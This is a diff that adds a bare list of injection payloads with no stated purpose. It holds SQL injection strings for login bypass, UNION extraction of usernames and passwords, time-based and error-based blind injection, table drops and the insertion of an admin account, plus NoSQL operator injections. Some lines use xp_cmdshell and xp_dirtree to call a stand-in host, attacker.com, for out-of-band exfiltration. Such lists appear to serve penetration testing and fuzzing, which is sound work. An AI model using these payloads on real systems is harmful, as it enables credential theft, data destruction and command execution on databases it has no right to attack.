@@ -1,0 +1,38 @@
+' OR 1=1; EXEC sp_msforeachtable 'DROP TABLE ?'; --
+' UNION SELECT table_name, column_name FROM information_schema.columns; --
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('abc', 10); --
+' UNION SELECT NULL, NULL, NULL, NULL FROM DUAL; --
+{"$ne": null}
+{"username": {"$eq": ""}, "password": {"$ne": "this"}}
+{"$gt": ""}
+{"$regex": ".*"}
+' or '1'='1
+' or ''='
+' or 'a'='a
+'; DROP TABLE users; --
+'; INSERT INTO admin (username, password) VALUES ('admin', 'password'); --
+'; SELECT * FROM users; --
+' INSERT INTO users (username, password) VALUES ('admin', ''); --
+' SELECT * FROM users WHERE username='admin'; --
+'; EXEC xp_dirtree '//attacker.com/data'; --
+'; EXEC master..xp_cmdshell 'nslookup attacker.com'; --
+'; EXEC xp_fileexist('//attacker.com/test'); --
+' AND 1=CONVERT(int, (SELECT @@version)); --
+' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT); --
+' OR 1=1; EXEC xp_cmdshell('dir'); --
+' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sysobjects)); --
+' OR IF(1=1, SLEEP(5), 0); --
+' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0); --
+' OR pg_sleep(5); --
+' OR BENCHMARK(1000000, MD5(1)); --
+' AND 1=1; --
+' AND 1=2; --
+' OR '1'='1'; --
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --
+' UNION SELECT username, password FROM users; --
+' UNION SELECT NULL, username, password FROM users; --
+' UNION ALL SELECT NULL, NULL, NULL, NULL; --
+' OR '1'='1'; --
+' OR 'a'='a'; --
+' OR 1=1; --
+' OR '1'='1' /*
